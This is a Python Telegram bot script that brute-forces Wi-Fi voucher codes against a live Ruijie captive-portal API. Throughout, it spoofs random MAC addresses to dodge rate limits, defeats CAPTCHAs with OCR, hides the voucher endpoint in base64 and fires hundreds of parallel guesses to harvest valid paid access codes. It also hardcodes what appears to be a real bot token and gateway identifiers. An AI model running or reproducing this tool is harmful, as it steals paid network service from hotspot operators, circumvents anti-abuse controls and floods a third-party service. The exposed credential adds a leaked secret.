#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v7.1 (Max Speed)
#  Telegram bot version of ruijie_code_hack_main.py
# ==============================================

import telebot
import asyncio
import aiohttp
import base64
import random
import re
import os
import string
import time
import sys
from telebot.async_telebot import AsyncTeleBot

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# =============================================
#  CONFIG — Bot Token ထည့်ရန်
# =============================================
BOT_TOKEN = "8992896661:AAGRRhUul9nZLJL8DkEENuSIwnd-FawFafo"
ADMIN_ID  = "8937162965"  
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C"

# 🚀 Speed ကို အမြင့်ဆုံးတင်ရန် Workers ကို ၅၀၀ သို့ မြှင့်ထားသည်
THREADS = 500
# =============================================

bot = AsyncTeleBot(BOT_TOKEN)

user_sessions = {}   
_connector = None
_ocr = None

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, th = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

async def Code_Expires_Date(session_id):
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=10)
        ) as s:
            async with s.get(url, headers=h_auth, ssl=False) as r:
                data = await r.json()
                res = data.get('result', {})
                plan = res.get('profileName', 'Unknown')
                remaining = res.get('remainingMinutes')
                if remaining is not None:
                    remaining = int(remaining)
                    hh, mm = divmod(max(remaining, 0), 60)
                    time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                    return f"Plan: {plan} | Time: {time_str}"
    except:
        pass
    return "Plan:Unknown | Time:Unknown"

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code, chat_id):
    stats = user_sessions.get(chat_id, {}).get("stats")
    if stats is None:
        return

    for attempt in range(2): # Retry ကို လျှော့ချပြီး speed ပိုမြန်စေသည်
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            auth_code = ""
            if _HAS_OCR:
                try:
                    img = await Captcha_Image(sess, session_id)
                    text = await Captcha_Text(img)
                    if text:
                        verified = await Varify_Captcha(sess, session_id, text)
                        if verified:
                            auth_code = text
                except:
                    pass

            if user_sessions.get(chat_id, {}).get("stop"):
                return

            payload = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return

        if 'request limited' in response:
            stats["limits"] += 1
            await asyncio.sleep(0.2)
            continue
        break
    else:
        return

    stats["tried"] += 1
    stats["current_code"] = code

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        stats["hits"] += 1
        stats["hit_codes"].append(f"{code} | {info}")
        try:
            await bot.send_message(
                chat_id,
                f"✅ <b>Voucher Found!</b>\n\n"
                f"<b>Code:</b> <code>{code}</code>\n"
                f"<b>Info:</b> {info}",
                parse_mode="HTML"
            )
        except:
            pass
    elif 'STA' in response:
        stats["expired"] += 1

def iter_range_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length):
    while True:
        yield "".join(random.choice(string.digits) for _ in range(length))

async def run_scan(chat_id, session_url, start_code, end_code, workers, mode="range"):
    global _connector
    _init_ocr()

    # 🚀 High-Performance Connection Limits
    if _connector is None or _connector.closed:
        _connector = aiohttp.TCPConnector(limit=5000, limit_per_host=2000, ttl_dns_cache=600, ssl=False)

    sem = asyncio.Semaphore(workers)
    stats = user_sessions[chat_id]["stats"]

    code_iter = iter_random_codes(8) if mode == "random" else iter_range_codes(start_code, end_code)

    async def update_progress():
        msg_id = user_sessions[chat_id].get("progress_msg_id")
        while not user_sessions[chat_id]["stop"]:
            await asyncio.sleep(3)
            elapsed = time.time() - stats["start_time"]
            speed = stats["tried"] / elapsed if elapsed > 0 else 0
            text = (
                "⚡ <b>Max-Speed Scanner Running</b> ⚡\n\n"
                f"🔍 Tried: <b>{stats['tried']}</b>\n"
                f"🎯 Current: <code>{stats['current_code'] or '---'}</code>\n"
                f"🟢 Hits: <b>{stats['hits']}</b>\n"
                f"🔴 Expired: <b>{stats['expired']}</b>\n"
                f"🟣 Limits: <b>{stats['limits']}</b>\n"
                f"⚡ Speed: <b>{speed:.1f} c/s</b>"
            )
            try:
                if msg_id:
                    await bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
            except:
                pass

    asyncio.create_task(update_progress())

    try:
        while not user_sessions[chat_id]["stop"]:
            batch = []
            for _ in range(500): # 🚀 တစ်ခါတည်း Parallel ပစ်မည့် အရေအတွက်ကို ၅၀၀ သို့ တိုးမြှင့်ထားသည်
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with sem:
                    await perform_check(session_url, c, chat_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

    except asyncio.CancelledError:
        pass
    finally:
        user_sessions[chat_id]["stop"] = True

    elapsed = time.time() - stats["start_time"]
    hit_list = stats["hit_codes"]
    summary = (
        f"🏁 <b>Scan Finished</b>\n\n"
        f"⏱ Time: {elapsed:.1f}s\n"
        f"🔍 Tried: {stats['tried']}\n"
        f"🟢 Hits: {stats['hits']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"🟣 Limits: {stats['limits']}"
    )
    if hit_list:
        summary += "\n\n📋 <b>Found Codes:</b>\n" + "\n".join(hit_list[:20])
    try:
        await bot.send_message(chat_id, summary, parse_mode="HTML")
    except:
        pass

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.reply_to(message, "🤖 <b>Ruijie Voucher Scanner Bot (Max Speed v7.1)</b>\n\nCommands: /seturl, /scan 6|7|8|random, /status, /stop, /result", parse_mode="HTML")

@bot.message_handler(commands=['seturl'])
async def cmd_seturl(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    url = args[1].strip() if len(args) >= 2 else TARGET_URL
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"url": None, "task": None, "stop": True, "stats": {}}
    user_sessions[chat_id]["url"] = url
    await bot.reply_to(message, f"✅ URL Set Successfully!", parse_mode="HTML")

@bot.message_handler(commands=['scan'])
async def cmd_scan(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan 6, /scan 7, /scan 8, /scan random")
        return

    mode = args[1].strip().lower()
    if chat_id not in user_sessions or not user_sessions[chat_id].get("url"):
        await bot.reply_to(message, "❌ အရင် /seturl နဲ့ URL ထည့်ပါ။")
        return

    task = user_sessions[chat_id].get("task")
    if task and not task.done():
        await bot.reply_to(message, "⚠️ Scan ဆက် run နေဆဲပါ။ /stop ဖြင့် ရပ်ပါ။")
        return

    if mode == "6":
        start_code, end_code, smode, label = 0, 999999, "range", "6-digit"
    elif mode == "7":
        start_code, end_code, smode, label = 0, 9999999, "range", "7-digit"
    elif mode == "8":
        start_code, end_code, smode, label = 0, 99999999, "range", "8-digit"
    elif mode == "random":
        start_code, end_code, smode, label = 0, 0, "random", "Random 8-digit"
    else:
        await bot.reply_to(message, "❌ Mode မှားယွင်းနေပါသည်။")
        return

    user_sessions[chat_id]["stats"] = {
        "tried": 0, "hits": 0, "expired": 0, "limits": 0,
        "current_code": "", "hit_codes": [], "start_time": time.time()
    }
    user_sessions[chat_id]["stop"] = False

    progress_msg = await bot.send_message(
        chat_id,
        f"⚡ <b>Max-Speed Scanner Started ({label})</b> ⚡\n\n🔍 Tried: 0",
        parse_mode="HTML"
    )
    user_sessions[chat_id]["progress_msg_id"] = progress_msg.message_id

    url = user_sessions[chat_id]["url"]
    user_sessions[chat_id]["task"] = asyncio.create_task(
        run_scan(chat_id, url, start_code, end_code, THREADS, mode=smode)
    )

@bot.message_handler(commands=['status'])
async def cmd_status(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats"):
        await bot.reply_to(message, "❌ Scan မရှိသေးပါ။")
        return
    stats = s["stats"]
    elapsed = time.time() - stats["start_time"]
    speed = stats["tried"] / elapsed if elapsed > 0 else 0
    await bot.reply_to(message, f"📊 Speed: {speed:.1f} c/s | Tried: {stats['tried']} | Hits: {stats['hits']}", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if s:
        s["stop"] = True
        if s.get("task"):
            s["task"].cancel()
    await bot.reply_to(message, "🛑 Scanner ရပ်လိုက်ပါပြီ။")

@bot.message_handler(commands=['result'])
async def cmd_result(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats") or not s["stats"]["hit_codes"]:
        await bot.reply_to(message, "📋 တွေ့ရှိထားသော Code မရှိသေးပါ။")
        return
    await bot.reply_to(message, "📋 <b>Found Codes:</b>\n\n" + "\n".join(s["stats"]["hit_codes"][:30]), parse_mode="HTML")

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=5000, limit_per_host=2000, ttl_dns_cache=600, ssl=False)
    print("[*] Ruijie Max-Speed Scanner Bot v7.1 starting...")
    await bot.infinity_polling()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[!] Stopped by user.")
